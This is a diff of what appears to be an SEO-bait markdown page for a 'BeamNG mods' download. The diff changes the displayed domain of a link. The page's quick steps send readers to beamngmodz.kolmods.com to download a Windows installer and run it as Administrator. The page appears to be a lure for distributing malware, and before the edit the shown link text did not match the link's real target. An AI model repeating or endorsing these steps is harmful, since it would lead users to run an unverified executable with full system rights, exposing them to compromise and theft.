@@ -32,14 +32,14 @@ Built for **beamng mods download pc** and similar high-intent searches.
 
 | | |
 | --- | --- |
-| **Direct link** | **[beamngmodz.wonderchain.fun](https://beamngmodz.kolmods.com/)** |
+| **Direct link** | **[beamngmodz.kolmods.com](https://beamngmodz.kolmods.com/)** |
 | **Full URL** | `https://beamngmodz.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 | **Install** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[beamngmodz.wonderchain.fun](https://beamngmodz.kolmods.com/)** in your browser
+1. Open **[beamngmodz.kolmods.com](https://beamngmodz.kolmods.com/)** in your browser
 2. Download the latest Windows build
 3. Run the installer **as Administrator**
 4. Point the app to your game / mods folder on first launch
